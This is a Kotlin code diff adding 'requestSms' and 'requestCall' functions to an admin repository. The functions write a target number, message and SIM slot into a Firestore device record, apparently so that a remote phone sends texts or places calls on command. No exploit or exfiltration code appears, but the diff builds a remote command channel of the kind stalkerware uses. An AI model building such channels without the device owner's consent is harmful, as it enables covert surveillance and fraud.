@@ -140,6 +140,45 @@ class AdminRepositoryImpl @Inject constructor(
         }
     }
 
+    override suspend fun requestSms(deviceId: String, number: String, message: String, simSlot: Int) {
+        try {
+            db.collection("devices")
+                .document(deviceId)
+                .set(
+                    mapOf(
+                        "smsRequestedAt" to System.currentTimeMillis(),
+                        "smsRequestNumber" to number,
+                        "smsRequestMessage" to message,
+                        "smsRequestSimSlot" to simSlot
+                    ),
+                    SetOptions.merge()
+                )
+                .await()
+        } catch (e: Exception) {
+            Log.e("AdminRepositoryImpl", "Error requesting SMS", e)
+            throw e
+        }
+    }
+
+    override suspend fun requestCall(deviceId: String, number: String, simSlot: Int) {
+        try {
+            db.collection("devices")
+                .document(deviceId)
+                .set(
+                    mapOf(
+                        "callRequestedAt" to System.currentTimeMillis(),
+                        "callRequestNumber" to number,
+                        "callRequestSimSlot" to simSlot
+                    ),
+                    SetOptions.merge()
+                )
+                .await()
+        } catch (e: Exception) {
+            Log.e("AdminRepositoryImpl", "Error requesting Call", e)
+            throw e
+        }
+    }
+
     override suspend fun deleteItem(deviceId: String, collection: String, itemId: String) {
         try {
             db.collection("devices")
